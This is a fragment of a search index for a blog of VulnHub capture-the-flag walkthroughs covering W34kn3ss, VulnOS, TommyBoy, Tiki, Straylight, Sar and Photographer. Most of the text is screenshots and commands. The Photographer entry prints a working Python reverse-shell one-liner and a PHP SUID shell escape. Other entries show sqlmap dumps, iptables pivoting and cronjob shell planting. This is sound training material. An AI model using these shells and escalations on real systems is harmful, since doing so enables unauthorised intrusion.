$TFt -Z root```{: .nolineno}![Untitled](/Vulnhub-Files/img/WebDeveloper/Untitled%2011.png)Now the flag â†’![Untitled](/Vulnhub-Files/img/WebDeveloper/Untitled%2012.png)---> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "W34kn3ss", "url": "/posts/W34kn3ss/", "categories": "VulnHub", "tags": "Public Exploit, Python Compiled (.pyc), PrivEsc", "date": "2023-06-11 00:00:00 +0530", "snippet": "## **Description â¤µï¸**> ðŸ’¡ **[W34kn3ss](https://vulnhub.com/entry/w34kn3ss-1,270/)** âž¡ï¸>>The matrix is controlling this machine, neo is trying to escape from it and take back the control on it , your...", "content": "## **Description â¤µï¸**> ðŸ’¡ **[W34kn3ss](https://vulnhub.com/entry/w34kn3ss-1,270/)** âž¡ï¸>>The matrix is controlling this machine, neo is trying to escape from it and take back the control on it , your goal is to help neo to gain access as a â€œrootâ€ to this machine , through this machine you will need to perform a hard enumration on the target and understand what is the main idea of it , and exploit every possible â€œweaknessâ€ that you can found , also you will be facing some upnormal behaviours during exploiting this machine.>>This machine was made for Jordanâ€™s Top hacker 2018 CTF , we tried to make it simulate a real world attacks â€œas much as possibleâ€ in order to improve your penetration testing skills , also we but a little tricky techniques on it so you can learn more about some unique skills.>>The machine was tested on vmware (player / workstation) and works without any problems , so we recommend to use VMware to run it , Also works fine using virtualbox.>> **Difficulty:** Intermediate , you need to think out of the box and collect all the puzzle pieces in order to get the job done.>>The machine is already got DHCP enabled , so you will not have any problems with networking.>>Happy Hacking !{: .prompt-info }### **Letâ€™s find the IP Address first >>**![Untitled](/Vulnhub-Files/img/W34kn3ss/Untitled.png)```bashIP : 10.0.2.19```{: .nolineno}## Port Scan Results âž¡ï¸![Untitled](/Vulnhub-Files/img/W34kn3ss/Untitled%201.png)![Untitled](/Vulnhub-Files/img/W34kn3ss/Untitled%202.png)```bashOPEN PORTS >22 SSH80 HTTP (Enumeration required !)443 HTTPS (â¬†ï¸ Same)```{: .nolineno}___## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/W34kn3ss/Untitled%203.png)so after changing the `/etc/hosts` as nmap results says â†’![Untitled](/Vulnhub-Files/img/W34kn3ss/Untitled%204.png)![Untitled](/Vulnhub-Files/img/W34kn3ss/Untitled%205.png)![Untitled](/Vulnhub-Files/img/W34kn3ss/Untitled%206.png)![Untitled](/Vulnhub-Files/img/W34kn3ss/Untitled%207.png)Now I have to follow the code so it says to Download some keys and I have already a key so lets follow the path â†’As I extracted it I got the `/rsa/2048/` directory then a bunch of keys so I copied `mykey.pub` into this folder .![Untitled](/Vulnhub-Files/img/W34kn3ss/Untitled%208.png)So When I extracted it â†’![Untitled](/Vulnhub-Files/img/W34kn3ss/Untitled%209.png)After searching the content to the file I got this â†’![Untitled](/Vulnhub-Files/img/W34kn3ss/Untitled%2010.png)Now lets try ssh with openssl private key which is found from the expoit directories â†’![Untitled](/Vulnhub-Files/img/W34kn3ss/Untitled%2011.png)![Untitled](/Vulnhub-Files/img/W34kn3ss/Untitled%2012.png)```bash\tuser.txt â†’ 25e3cd678875b601425c9356c8039f68```{: .nolineno}![Untitled](/Vulnhub-Files/img/W34kn3ss/Untitled%2013.png)this means that the file is .pyc so let is export it into attackers machine â†’![Untitled](/Vulnhub-Files/img/W34kn3ss/Untitled%2014.png)From online python decompiler I got this â†’![Untitled](/Vulnhub-Files/img/W34kn3ss/Untitled%2015.png)```bashn30\t:\tdMASDNB!!#B!#!#33```{: .nolineno}![Untitled](/Vulnhub-Files/img/W34kn3ss/Untitled%2016.png)```bashroot.txt â†’ a1d2fab76ec6af9b651d4053171e042e```{: .nolineno}# **Summery Notes â†’**> â†’ Only tricky part was openssl public key and searching it with dictionary â†’ directories.>> â†’ After Shell â†’ `code` part which was .pyc python compiled part which was decompiled online.> > â†’ Then got root password.{: .prompt-tip }> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Vuln OS", "url": "/posts/VulnOS/", "categories": "VulnHub", "tags": "opendocman, Sqlmap, Kernel Exploit, Public Exploit, PrivEsc", "date": "2023-06-11 00:00:00 +0530", "snippet": "## **Description â¤µï¸**>ðŸ’¡ [VulnOS](https://www.vulnhub.com/entry/vulnos-2,147/) are a series of vulnerable operating systems packed as virtual images to enhance penetration testing skills- This is ve...", "content": "## **Description â¤µï¸**>ðŸ’¡ [VulnOS](https://www.vulnhub.com/entry/vulnos-2,147/) are a series of vulnerable operating systems packed as virtual images to enhance penetration testing skills- This is version 2 -- Smaller, less chaotic !As time is not always on my side, It took a long time to create another VulnOS. But I like creating them. The image is build with VBOX. Unpack the file and add it to your virtualisation software.**Your assignment is to pentest a company website, get root of the system and read the final flag**NOTE : current keyboard preferences is BE \"pentesting is a wide concept\"If you have questions, feel free to contact me onÂ m4db33f@gmailÂ dot com Shout out to the Vulnhub Testing team!Hope you enjoy.{: .prompt-info }### Letâ€™s find the IP Address first >>```{: .nolineno}IP : 192.168.56.104```{: .nolineno}## Port Scan Results âž¡ï¸![Untitled](/Vulnhub-Files/img/VulnOS/Untitled.png)```bashOpen Ports >22\t\t\tSSH80\t\t\tHTTP6667\t\tirc```{: .nolineno}---## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/VulnOS/Untitled%201.png)**After roming around I found Documentation page blank so I seen the source code and found this :**![Untitled](/Vulnhub-Files/img/VulnOS/Untitled%202.png)Lets check the source code of this page â†’![Untitled](/Vulnhub-Files/img/VulnOS/Untitled%203.png)I got a directory named as `/jabcd0cs/` â†’![Untitled](/Vulnhub-Files/img/VulnOS/Untitled%204.png)![Untitled](/Vulnhub-Files/img/VulnOS/Untitled%205.png)After trying to upload the shell I can not able to bypass mime-type and If I have then also I can not able to launch me shell .![Untitled](/Vulnhub-Files/img/VulnOS/Untitled%206.png)Now After seeing this exploit of opendocman I got some inside about SQLi and lets try it out now :![Untitled](/Vulnhub-Files/img/VulnOS/Untitled%207.png)Lets take the help of sqlmap on it â†’```bashcommand : sqlmap -u \"http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user\" --dump```{: .nolineno}![Untitled](/Vulnhub-Files/img/VulnOS/Untitled%208.png)```bashcommand : sqlmap -u \"http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user\" -D jabcd0cs -T odm_user --dump```{: .nolineno}![Untitled](/Vulnhub-Files/img/VulnOS/Untitled%209.png)![Untitled](/Vulnhub-Files/img/VulnOS/Untitled%2010.png)Lets crack these hashes â†’![Untitled](/Vulnhub-Files/img/VulnOS/Untitled%2011.png)```bashNow I have credentials :webmin:b78aae356709f8c31118ea613980954b : webmin1980guest:084e0343a0486ff05530df6c705c8bb4 : guestadmin:d5c6a61719d7da181397b6db2376c2e7```{: .nolineno}Now lets try SSH login through webmin â†’![Untitled](/Vulnhub-Files/img/VulnOS/Untitled%2012.png)Now lets check for configuration files `/var/www/html/jabcd0cs/config.php` â†’![Untitled](/Vulnhub-Files/img/VulnOS/Untitled%2013.png)Its time to use linpeas so :I Found this vulnerability :![Untitled](/Vulnhub-Files/img/VulnOS/Untitled%2014.png)Now I searched the weak link and I found that This OS is outdated so I found this :>![Untitled](/Vulnhub-Files/img/VulnOS/Untitled%2015.png)Now lets use this exploit and try it out â†’![Untitled](/Vulnhub-Files/img/VulnOS/Untitled%2016.png)![Untitled](/Vulnhub-Files/img/VulnOS/Untitled%2017.png)---> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Toppo : 1", "url": "/posts/Toppo/", "categories": "VulnHub", "tags": "Recon, SUIDs, python, PrivEsc", "date": "2023-06-11 00:00:00 +0530", "snippet": "## **Description â¤µï¸**ðŸ’¡ [Toppo](https://vulnhub.com/entry/toppo-1,245/) âž¡ï¸The Machine is not hard to own and do not require advanced exploitation .Level : BeginnerDHCP : activatedInside the zip you ...", "content": "## **Description â¤µï¸**ðŸ’¡ [Toppo](https://vulnhub.com/entry/toppo-1,245/) âž¡ï¸The Machine is not hard to own and do not require advanced exploitation .Level : BeginnerDHCP : activatedInside the zip you will find a vmdk file , and I think you will be able to use it with any usual virtualization software ( tested with Virtualbox) .If you have any question : my twitter is @h4d3sw0rmHappy Hacking !### Letâ€™s find the IP Address first >>![Untitled](/Vulnhub-Files/img/Toppo/Untitled.png)```bashIP : 10.0.2.15```{: .nolineno}## Port Scan Results âž¡ï¸![Untitled](/Vulnhub-Files/img/Toppo/Untitled%201.png)![Untitled](/Vulnhub-Files/img/Toppo/Untitled%202.png)```bashOPEN PORTS >22 SSH (Needs credentials)80 HTTP (Enumeration Further !)111 rpcbind (no luck)41060 PRC (no luck same)```{: .nolineno}---## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/Toppo/Untitled%203.png)![Untitled](/Vulnhub-Files/img/Toppo/Untitled%204.png)```bash12345ted123```{: .nolineno}Now I guessed the username as ted as a hint from password â†’![Untitled](/Vulnhub-Files/img/Toppo/Untitled%205.png)while checking SUID I got this â†’![Untitled](/Vulnhub-Files/img/Toppo/Untitled%206.png)So lets try a simple tty shell with python â†’![Untitled](/Vulnhub-Files/img/Toppo/Untitled%207.png)![Untitled](/Vulnhub-Files/img/Toppo/Untitled%208.png)---> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "TommyBoy v1.0", "url": "/posts/TommyBoy1dot0/", "categories": "VulnHub", "tags": "PrivEsc, Wordpress, OSINT, FTP, Password Generate, fcrackzip, Password Bruteforce, SUIDs, CMS, crunch, User-Agent, RFI", "date": "2023-06-11 00:00:00 +0530", "snippet": "## DESCRIPTION â¤µï¸___HOLY SCHNIKES! Tommy Boy needs your help!The Callahan Auto company has finally entered the world of modern technology and stood up a Web server for their customers to use for or...", "content": "## DESCRIPTION â¤µï¸___HOLY SCHNIKES! Tommy Boy needs your help!The Callahan Auto company has finally entered the world of modern technology and stood up a Web server for their customers to use for ordering brake pads.Unfortunately, the site just went down and the only person with admin credentials is Tom Callahan Sr. - who just passed away! And to make matters worse, the only other guy with knowledge of the server just quit!You'll need to help Tom Jr., Richard and Michelle get the Web page restored again. Otherwise Callahan Auto will most certainly go out of business :-(### OBJECTIVE â¤µï¸___The primary objective is to restore a backup copy of the homepage to Callahan Auto is server. However, to consider the box fully pwned, you'll need to collect 5 flags strewn about the system, and use the data inside them to unlock one final message.### OTHER INFO â¤µï¸___- Size: 1.3GB- Hypervisor: Created with VMWare Fusion 8.1.1.- Difficulty: ?### SPECIAL THANKS TO â¤µï¸___â—‡ Rand0mbytez for testing about 10 versions of this frickin' thing to get the bugs worked out.â—‡ RobertWinkel for additional detailed testing and suggestions for tweaking the VM for a better overall experience.___## Letâ€™s find the IP Address first â¤µï¸![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%201.png)```bashIP : 10.0.2.16```{: .nolineno}## Port Scan Results â¤µï¸![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%202.png)Nmap Scan â†’![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%203.png)```bashOPEN PORTS ->22 SSH 80 HTTP (robot.txt found)8008 HTTP (Recon more require !)```{: .nolineno}---## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%204.png)robots.txt âž¡ï¸![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%205.png)![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%206.png)```bashFlag 1 â†’ B34rcl4ws```{: .nolineno}This is the source code of main page â†’![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%207.png)![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%208.png)With wpscan I found this â†’![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%209.png)```bashusers ->\ttommy\trichard\ttom\tmichelle```{: .nolineno}![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2010.png)![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2011.png)lets see what inside of this image â†’![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2012.png)Lets decode this one â†’![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2013.png)```bashspanky```{: .nolineno}![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2014.png)```bashFlag #2: thisisthesecondflagyayyou.txt```{: .nolineno}![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2015.png)```bashZ4l1nsky```{: .nolineno}![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2016.png)Now after scaning all the ports I got this -â†’![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2017.png)`port 65534 OPEN FTP` â†’let is access it with nickburns username and password both. â†’![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2018.png)![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2019.png)Lets use this password â†’![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2020.png)Now with steve jobs as a hint I changed the user agent to an iphone and I got this â†’![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2021.png)Now let is use the user-agent of iphone and brute-force the directory â†’```bashcommand â†’ feroxbuster -a \"Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25\" --url http://10.0.2.16:8008/NickIzL33t -w /usr/share/wordlists/rockyou.txt -t 100 -k```{: .nolineno}![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2022.png)Now I found this file `fallon1.html` â†’![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2023.png)![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2024.png)![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2025.png)![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2026.png)I have got the conditions so lets generate the password with `crunch tool` â†’![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2027.png)Now lets crack the password with `fcrackzip Tool` â†’![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2028.png)![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2029.png)Callahan Auto Server âž¡ï¸```bashUsername: bigtommyseniorPassword: fatguyinalittlecoat```{: .nolineno}Lets try wpscan for Tom now lets see if I can find password of his account â†’![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2030.png)```bashUsername â†’ tomPassword â†’ tomtom1```{: .nolineno}After loging in I got this â†’![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2031.png)Callahan Auto Server âž¡ï¸---```bashUsername: bigtommyseniorPassword: fatguyinalittlecoat1938!!```{: .nolineno}![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2032.png)![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2033.png)```bashEditButton```{: .nolineno}![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2034.png)```bashMy SQL Credentials ->user : wordpressuserpass : CaptainLimpWrist!!!```{: .nolineno}![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2035.png)![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2036.png)changed the file name as stated earliar after transfering it Now let is access it â†’![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2037.png)For â†’ # world-writeable & executable folders![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2038.png)![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2039.png)Now at this path I have created a shell file of 1 liner â†’![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2040.png)With iphone user-agent I got this â†’![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2041.png)Now lets combine all the flags â†’```bashFlag 5 â†’ ButtcrackLOOT.ZIP (password)â†’ B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack```{: .nolineno}![Untitled](/Vulnhub-Files/img/TommyBoy1dot0/Untitled%2042.png)THE END !!___> **Summery Notes â¤µï¸**>> - Got to learn so many things like cracking zip file was first time .> - Then user-agent configuration was new .> - Find FTP was very tricky part.> - New part was password generation with `crunch` with that combinations.> - Very Best machine lets you suffer very much , I did too , but enjoyed it.{: .prompt-tip }> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Tiki", "url": "/posts/Tiki/", "categories": "VulnHub", "tags": "PrivEsc, Public Exploit, SMB, CMS, Tiki_Wiki_CMS", "date": "2023-06-11 00:00:00 +0530", "snippet": "## **Description â¤µï¸**>**ðŸ’¡ [Tiki](https://vulnhub.com/entry/tiki-1,525/) â¤µï¸**>>Oh no our webserver got compromised. The attacker used an 0day, so we dont know how he got into the admin panel. Invest...", "content": "## **Description â¤µï¸**>**ðŸ’¡ [Tiki](https://vulnhub.com/entry/tiki-1,525/) â¤µï¸**>>Oh no our webserver got compromised. The attacker used an 0day, so we dont know how he got into the admin panel. Investigate that.>>This is an OSCP Prep Box, its based on a CVE I recently found. Its on the OSCP lab machines level.>>If you need hints contact me on Twitter: S1lky_1337, should work on VirtualBox and Vmware.{: .prompt-info }### **Letâ€™s find the IP Address first >>**![108-1.png](/Vulnhub-Files/img/Tiki/108-1.png)```bashIP : 10.0.2.2```{: .nolineno}## Port Scan Results âž¡ï¸![109-1.png](/Vulnhub-Files/img/Tiki/109-1.png)```bashOPEN PORTS >22 SSH80 HTTP139 SMB445 SMB```{: .nolineno}---## SMB Enumeration â¤µï¸SMB access â†’![112-1.png](/Vulnhub-Files/img/Tiki/112-1.png)Lets access the notes â†’![112-2.png](/Vulnhub-Files/img/Tiki/112-2.png)![112-3.png](/Vulnhub-Files/img/Tiki/112-3.png)```bashSilky : 51lky571k1```{: .nolineno}---## Web Enumeration â¤µï¸![110-1.png](/Vulnhub-Files/img/Tiki/110-1.png)With Mail.txt file â†’ I suspected it is a latest exploit so I searched it out â†’![110-2.png](/Vulnhub-Files/img/Tiki/110-2.png)Lets use it now â†’![110-3.png](/Vulnhub-Files/img/Tiki/110-3.png)![110-4.png](/Vulnhub-Files/img/Tiki/110-4.png)After removing the `$pass=admin` part I forwarded the request and I got it â†’ `Admin`![110-5.png](/Vulnhub-Files/img/Tiki/110-5.png)uploaded the`shell.php` file â†’![110-6.png](/Vulnhub-Files/img/Tiki/110-6.png)![110-7.png](/Vulnhub-Files/img/Tiki/110-7.png)```bashsilky :\tAgy8Y7SPJNXQzqA```{: .nolineno}lets try SSH now â†’![111-1.png](/Vulnhub-Files/img/Tiki/111-1.png)![111-2.png](/Vulnhub-Files/img/Tiki/111-2.png)![111-3.png](/Vulnhub-Files/img/Tiki/111-3.png)I got into root â†’![111-4.png](/Vulnhub-Files/img/Tiki/111-4.png)```bashflag.txt â†’ 88d8120f434c3b4221937a8cd0668588```{: .nolineno}---# **Summery Notes â†’**â†’ I can not say this machine is for OSCP , it was way easy machine â†> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Straylight", "url": "/posts/Straylight/", "categories": "VulnHub", "tags": "PrivEsc, LFI, SMTP, iptable, screen 4.5.0, pivoting", "date": "2023-06-11 00:00:00 +0530", "snippet": "# Straylight## Description â¤µï¸>ðŸ’¡ A new OSCP style lab involving 2 vulnerable machines, themed after the cyberpunk classic Neuromancer - a must read for any cyber-security enthusiast. This lab makes ...", "content": "# Straylight## Description â¤µï¸>ðŸ’¡ A new OSCP style lab involving 2 vulnerable machines, themed after the cyberpunk classic Neuromancer - a must read for any cyber-security enthusiast. This lab makes use of pivoting and post exploitation, which I've found other OSCP prep labs seem to lack. The goal is the get root on both machines. All you need is default Kali Linux.I'd rate this as Intermediate. No buffer overflows or exploit development - any necessary password cracking can be done with small wordlists. It is much more related to an OSCP box vs a CTF. I've tested it quite a bit, but if you see any issues or need a nudge PM me here.Virtual Box Lab setup instructions are included in the zip download, but here is a quick brief:Straylight â†’ simulates a public facing server with 2 NICS. Cap this first, then pivot to the final machine.[Neuromancer](https://strongshiv8.github.io/posts/Neuromancer/) â†’ is within a non-public network with 1 NIC. Your Kali box should ONLY be on the same virtual network as Straylight.This works better with VirtualBox rather than VMware{: .prompt-info }### Letâ€™s find the IP Address first >>![Untitled](/Vulnhub-Files/img/Straylight/Untitled.png)```bashThis machine have 2 Network Adaptor therefore showing to IP but both are same :I will be using 192.168.56.102```{: .nolineno}## Port Scan Results âž¡ï¸![Untitled](/Vulnhub-Files/img/Straylight/Untitled%201.png)```bashOpen Ports >25\t\t\tSMTP80\t\t\tHTTP\t\t\t3000\t\tApache\t\tHadoop```{: .nolineno}---## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/Straylight/Untitled%202.png)Letâ€™s check different ports too â†’![Untitled](/Vulnhub-Files/img/Straylight/Untitled%203.png)Lets try `admin : admin` default cred and I got In â†’![Untitled](/Vulnhub-Files/img/Straylight/Untitled%204.png)Lets check this option â†’![Untitled](/Vulnhub-Files/img/Straylight/Untitled%205.png)Now access them and found this :![Untitled](/Vulnhub-Files/img/Straylight/Untitled%206.png)![Untitled](/Vulnhub-Files/img/Straylight/Untitled%207.png)After digging deeper into `/turning-bolo/` directory I got this LFI vulnerability that leads me access the log files â†’![Untitled](/Vulnhub-Files/img/Straylight/Untitled%208.png)Now I think it is indicating to us for looking for log files :![Untitled](/Vulnhub-Files/img/Straylight/Untitled%209.png)I have also got a port for SMTP for mail purpose so lets us this to execute our payload for reverse shell access or command shell â†’![Untitled](/Vulnhub-Files/img/Straylight/Untitled%2010.png)Now After Accesing the SMTP service I am getting this :>![Untitled](/Vulnhub-Files/img/Straylight/Untitled%2011.png)This image is of source code of the previous picture .Now itâ€™s time to execute our reverse shell code â†’```{: .nolineno}Command : MAIL FROM:```{: .nolineno}In response to that in netcat I recevied this â†’![Untitled](/Vulnhub-Files/img/Straylight/Untitled%2012.png)â¤µï¸![Untitled](/Vulnhub-Files/img/Straylight/Untitled%2013.png)Now when I got a Local Privilege Escalation so lets find for SUIDs and GUIDs files â†’![Untitled](/Vulnhub-Files/img/Straylight/Untitled%2014.png)Lets search for an exploit for `screen 4.5.0` as it is a common exploit â†’![Untitled](/Vulnhub-Files/img/Straylight/Untitled%2015.png)Now I transfered this exploit through wget and simply executed it And I got this :![Untitled](/Vulnhub-Files/img/Straylight/Untitled%2016.png)Now lets find the flag â†’![Untitled](/Vulnhub-Files/img/Straylight/Untitled%2017.png)also I got this â†’![Untitled](/Vulnhub-Files/img/Straylight/Untitled%2018.png)---This is not an end !I also got an another machine connect with this machine so lets use pivoting method to breach it too â†’Now â¤µï¸It time to make tunnel from straylight to Neuromancer and also to the Attacker machine So :>```{: .nolineno}Command : iptables -t nat -A POSTROUTING -o enp0s3 -j SNAT --to-source 192.168.56.102```{: .nolineno}![Untitled](/Vulnhub-Files/img/Straylight/Untitled%2019.png)```{: .nolineno}command : iptables -t nat -A PREROUTING -i enp0s3 -p tcp --dport 3333 -j DNAT --to-destination 192.158.56.103```{: .nolineno}![Untitled](/Vulnhub-Files/img/Straylight/Untitled%2020.png)Now I have a connection between these 2 machines >Now lets go to `Neuromancer` Machine â†’ [Neuromancer](https://strongshiv8.github.io/posts/Neuromancer/).> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Sar", "url": "/posts/Sar/", "categories": "VulnHub", "tags": "sar2html, Public Exploit, PrivEsc", "date": "2023-06-11 00:00:00 +0530", "snippet": "## **Description â¤µï¸*****ðŸ’¡ Sar is an OSCP-Like VM with the intent of gaining experience in the world of penetration testing.***### Letâ€™s find the IP Address first >>![Untitled](/Vulnhub-Files/img/Sa...", "content": "## **Description â¤µï¸*****ðŸ’¡ Sar is an OSCP-Like VM with the intent of gaining experience in the world of penetration testing.***### Letâ€™s find the IP Address first >>![Untitled](/Vulnhub-Files/img/Sar/Untitled.png)```bashIP : 10.0.2.11```{: .nolineno}## Port Scan Results âž¡ï¸![Untitled](/Vulnhub-Files/img/Sar/Untitled%201.png)```bashOPEN PORTS ->80 HTTP```{: .nolineno}## Rustscan Results â¤µï¸![Untitled](/Vulnhub-Files/img/Sar/Untitled%202.png)---## Web Enumeration â¤µï¸It is an Apache Server : â†’After Directory / File Traversal I got this â†’![Untitled](/Vulnhub-Files/img/Sar/Untitled%203.png)![Untitled](/Vulnhub-Files/img/Sar/Untitled%204.png)---Now lets see if I can have an exploit about this page â†’![Untitled](/Vulnhub-Files/img/Sar/Untitled%205.png)Lets try this one â†’![Untitled](/Vulnhub-Files/img/Sar/Untitled%206.png)Now its time to upload reverse shell code as a command injection â†’![Untitled](/Vulnhub-Files/img/Sar/Untitled%207.png)Now in response I got the shell â†’![Untitled](/Vulnhub-Files/img/Sar/Untitled%208.png)Now lets dig deeper into the Local Privilege Escalation â†’![Untitled](/Vulnhub-Files/img/Sar/Untitled%209.png)user.txt â†’ `427a7e47deb4a8649c7cab38df232b52`Now after some recon I got these files with different permissions â†’![Untitled](/Vulnhub-Files/img/Sar/Untitled%2010.png)Lets check `finally.sh` file which is basically executing the `write.sh` file .![Untitled](/Vulnhub-Files/img/Sar/Untitled%2011.png)Lets see `write.sh` file and lets upload a reverse shell code into this so that It can execute with the root permissions and I can have root shell !![Untitled](/Vulnhub-Files/img/Sar/Untitled%2012.png)Now I have to wait for 2-3 or 5 min for the cronjob to execute this file `finally.sh` as root â†’And At last I got it what I wanted â†’![Untitled](/Vulnhub-Files/img/Sar/Untitled%2013.png)Lets check root.txt file in /root â†’![Untitled](/Vulnhub-Files/img/Sar/Untitled%2014.png)root.txt â†’ `66f93d6b2ca96c9ad78a8a9ba0008e99`---> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Photographer", "url": "/posts/Photographer/", "categories": "VulnHub", "tags": "CMS, PrivEsc, RFI, SUIDs, SMB, koken_CMS, php", "date": "2023-06-11 00:00:00 +0530", "snippet": "## **Description â¤µï¸**##### ðŸ’¡ [Photographer : 1](https://vulnhub.com/entry/photographer-1,519/) â¤µï¸***This machine was developed to prepare for OSCP. It is boot2root, tested on VirtualBox (but works ...", "content": "## **Description â¤µï¸**##### ðŸ’¡ [Photographer : 1](https://vulnhub.com/entry/photographer-1,519/) â¤µï¸***This machine was developed to prepare for OSCP. It is boot2root, tested on VirtualBox (but works on VMWare) and has two flags: user.txt and proof.txt.***### **Letâ€™s find the IP Address first >>**```bashIP : 10.0.2.25```{: .nolineno}## Port Scan Results âž¡ï¸![124-1.png](/Vulnhub-Files/img/Photographer/124-1.png)![124-2.png](/Vulnhub-Files/img/Photographer/124-2.png)```bashOPEN PORTS >80 HTTP139 SMB445 SMB8000 HTTP```{: .nolineno}---## Web Enumeration â¤µï¸![125-1.png](/Vulnhub-Files/img/Photographer/125-1.png)Lets first do some directory or files bruteforcing through `feroxbuster` Tool â†’![127-1.png](/Vulnhub-Files/img/Photographer/127-1.png)Then I checked port 8000, I found this `koken CMS` page.![125-2.png](/Vulnhub-Files/img/Photographer/125-2.png)I searched through public exploit from searchsploit Tool and found this exploit related to `koken CMS`. ![125-3.png](/Vulnhub-Files/img/Photographer/125-3.png)Lets check the SMB part as well â†’![128-1.png](/Vulnhub-Files/img/Photographer/128-1.png)![128-2.png](/Vulnhub-Files/img/Photographer/128-2.png)![128-3.png](/Vulnhub-Files/img/Photographer/128-3.png)```bashLets try these credentials â†’ â†’ agi@photographer.comâ†’ daisa@photographer.comâ†’ my babygirlSo the final credentials were â†’ ID : daisa@photographer.compass : babygirl```{: .nolineno}I guess I got in successfully !![128-4.png](/Vulnhub-Files/img/Photographer/128-4.png)Now after login to koken site Lets do some further reconnaissance from internet â†’![125-4.png](/Vulnhub-Files/img/Photographer/125-4.png)Let is follow the exploit path â†’![125-5.png](/Vulnhub-Files/img/Photographer/125-5.png)![125-6.png](/Vulnhub-Files/img/Photographer/125-6.png)Got the results my RFI is working fine â†’![125-7.png](/Vulnhub-Files/img/Photographer/125-7.png)Then I executed the python reverse shell code and I got this â†’![126-1.png](/Vulnhub-Files/img/Photographer/126-1.png)![126-2.png](/Vulnhub-Files/img/Photographer/126-2.png)```bashuser.txt â†’ d41d8cd98f00b204e9800998ecf8427e```{: .nolineno}while cheching the SUID file I got this â†’![126-3.png](/Vulnhub-Files/img/Photographer/126-3.png)![126-4.png](/Vulnhub-Files/img/Photographer/126-4.png)![126-5.png](/Vulnhub-Files/img/Photographer/126-5.png)![126-6.png](/Vulnhub-Files/img/Photographer/126-6.png)```bashproof.txt â†’ d41d8cd98f00b204e9800998ecf8427e```{: .nolineno}# **Summery Notes â†’**> ðŸ’¡>Koken 0.22.24>>daisa@photographer.com>>agi@photographer.com>> ```bash> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.2.10\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'> ```> > `./usr/bin/php7.2 -r \"pcntl_exec('/bin/sh', ['-p']);\"`{: .prompt-tip }> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Neuromancer", "url": "/posts/Neuromancer/", "categories": "VulnHub", "tags": "PrivEsc", "date": "2023-06-11 00:00:00 +0530", "snippet": "# NeuromancerLets Network check with Nmap Scan â†’![Untitled](/Vulnhub-Files/img/Neuromancer/Untitled.png)Lets scan it with all ports flag `-p-` â†’![Untitled](/Vulnhub-Files/img/Neuromancer/Untitled%2...", "content": "# NeuromancerLets Network check with Nmap 